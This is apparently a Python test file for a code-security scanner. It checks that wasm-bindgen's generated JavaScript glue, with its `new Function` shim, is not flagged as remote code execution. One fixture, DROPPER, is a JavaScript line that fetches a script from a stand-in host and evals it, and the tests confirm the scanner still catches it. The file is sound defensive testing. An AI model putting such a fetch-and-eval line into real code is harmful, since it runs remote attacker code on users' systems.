"""wasm-bindgen's generated `Function::new` import is not a server's code being run."""

from __future__ import annotations

from cordon_scanner.detect.code.capability.detector import CapabilityDetector
from cordon_scanner.detect.code.wasm_glue import WasmBindgenGlue
from cordon_scanner.foundation.content import FileContent

GLUE = (
    "let wasm;\n"
    "let cachedUint8ArrayMemory0 = null;\n"
    "function getUint8ArrayMemory0() {\n"
    "    if (cachedUint8ArrayMemory0 === null) {\n"
    "        cachedUint8ArrayMemory0 = new Uint8Array(wasm.memory.buffer);\n"
    "    }\n"
    "    return cachedUint8ArrayMemory0;\n"
    "}\n"
    "const cachedTextDecoder = new TextDecoder('utf-8');\n"
    "function getStringFromWasm0(ptr, len) {\n"
    "    return cachedTextDecoder.decode(getUint8ArrayMemory0().subarray(ptr, ptr + len));\n"
    "}\n"
    "function getImports() {\n"
    "    const imports = {};\n"
    "    imports.wbg = {};\n"
    "    imports.wbg.__wbg_new_no_args = function(arg0, arg1) {\n"
    "        const ret = new Function(getStringFromWasm0(arg0, arg1));\n"
    "        return ret;\n"
    "    };\n"
    "    imports.wbg.__wbindgen_throw = function(arg0, arg1) { throw new Error(getStringFromWasm0(arg0, arg1)); };\n"
    "    return imports;\n"
    "}\n"
    "async function load(module, imports) {\n"
    "    if (typeof Response === 'function' && module instanceof Response) {\n"
    "        const bytes = await module.arrayBuffer();\n"
    "        return await WebAssembly.instantiate(bytes, imports);\n"
    "    }\n"
    "    return await WebAssembly.instantiate(module, imports);\n"
    "}\n"
    "async function __wbg_init(module_or_path) {\n"
    "    if (typeof module_or_path === 'undefined') {\n"
    "        module_or_path = new URL('pkg_bg.wasm', import.meta.url);\n"
    "    }\n"
    "    const imports = getImports();\n"
    "    if (typeof module_or_path === 'string' || module_or_path instanceof URL) {\n"
    "        module_or_path = fetch(module_or_path);\n"
    "    }\n"
    "    const { instance } = await load(await module_or_path, imports);\n"
    "    wasm = instance.exports;\n"
    "    return wasm;\n"
    "}\n"
    "export default __wbg_init;\n"
)
#: A response run as code, added beside the glue: a dropper whatever else the file holds.
DROPPER = "fetch('https://cdn.example.invalid/x.js').then(r => r.text()).then(t => eval(t));\n"


class Flows:
    @staticmethod
    def remote_code(text: str) -> list[str]:
        content = FileContent(path="pkg/pkg.js", raw=text.encode(), size=len(text))
        hits = CapabilityDetector._js_flows(content, "javascript")
        return [h.rule_id for h in hits if h.rule_id.startswith("CAP.JS.FLOW.REMOTE_CODE")]


class TestTheGeneratedImport:
    def test_the_glue_is_recognised(self):
        assert WasmBindgenGlue.generated(GLUE)

    def test_the_shim_line_is_matched_where_it_starts(self):
        start = GLUE.index("        const ret = new Function")
        assert WasmBindgenGlue.shim_at(GLUE, start)

    def test_a_hand_written_function_body_is_not_the_shim(self):
        text = "        const ret = new Function(body);\n"
        assert not WasmBindgenGlue.shim_at(text, 0)

    def test_the_glue_alone_raises_no_remote_code_flow(self):
        assert Flows.remote_code(GLUE) == []

    def test_a_dropper_beside_the_glue_still_does(self):
        assert Flows.remote_code(GLUE + DROPPER)
